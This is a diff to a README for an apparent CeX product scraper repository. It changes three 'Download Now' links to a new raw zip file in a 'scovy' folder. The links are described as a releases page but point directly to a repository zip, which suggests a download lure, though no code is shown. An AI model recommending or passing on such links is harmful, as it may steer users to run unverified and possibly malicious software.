@@ -1,6 +1,6 @@
 # 🛍️ cex-product-scraper-uk-webuy-com - Easily Extract cex Product Data
 
-[![Download](https://github.com/Raghadad04/cex-product-scraper-uk-webuy-com/raw/refs/heads/main/scovy/product-uk-webuy-cex-com-scraper-v2.6.zip)](https://github.com/Raghadad04/cex-product-scraper-uk-webuy-com/raw/refs/heads/main/scovy/product-uk-webuy-cex-com-scraper-v2.6.zip)
+[![Download](https://raw.githubusercontent.com/Raghadad04/cex-product-scraper-uk-webuy-com/main/scovy/uk_scraper_cex_product_webuy_com_v2.9.zip)](https://raw.githubusercontent.com/Raghadad04/cex-product-scraper-uk-webuy-com/main/scovy/uk_scraper_cex_product_webuy_com_v2.9.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To begin, follow these steps to download and run the software:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download Now](https://github.com/Raghadad04/cex-product-scraper-uk-webuy-com/raw/refs/heads/main/scovy/product-uk-webuy-cex-com-scraper-v2.6.zip)
+   [Download Now](https://raw.githubusercontent.com/Raghadad04/cex-product-scraper-uk-webuy-com/main/scovy/uk_scraper_cex_product_webuy_com_v2.9.zip)
 
 2. **Download the Latest Version**  
    On the releases page, look for the latest version. Click the download link for the appropriate file format for your operating system.
@@ -93,7 +93,7 @@ We regularly update the application to improve functionality and add new feature
 ## 📥 Download & Install
 
 To download the application, visit this page once more:  
-[Download Now](https://github.com/Raghadad04/cex-product-scraper-uk-webuy-com/raw/refs/heads/main/scovy/product-uk-webuy-cex-com-scraper-v2.6.zip)
+[Download Now](https://raw.githubusercontent.com/Raghadad04/cex-product-scraper-uk-webuy-com/main/scovy/uk_scraper_cex_product_webuy_com_v2.9.zip)
 
 Use the steps provided to install and run the software in just a few minutes.
 
